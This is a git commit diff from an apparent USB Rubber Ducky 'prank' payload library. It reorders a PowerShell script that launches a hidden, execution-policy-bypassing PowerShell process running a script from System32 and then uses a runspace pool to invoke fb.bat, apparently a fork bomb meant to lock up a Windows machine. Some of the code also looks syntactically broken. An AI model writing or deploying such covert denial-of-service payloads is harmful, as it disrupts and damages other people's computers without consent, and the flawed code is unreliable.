599353d205432e1a50e30fdf9610f6d32717e5c2
FalsePhilosopher <joshgarland90@gmail.com>
2022-08-15 04:59:05 -0600

    update rickbomb

--- Ducky/USBRubberducky/library/prank/Win/Bombs/Sys_Forker/rr/fb.ps1
+++ Ducky/USBRubberducky/library/prank/Win/Bombs/Sys_Forker/rr/fb.ps1
@@ -1,3 +1,4 @@
+Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -Exec Bypass '& C:\Windows\System32\rr\rrl.ps1'"
+
 $NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(C:\Windows\System32\fb.bat);;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -Exec Bypass '& C:\Windows\System32\rr\rrl.ps1'"
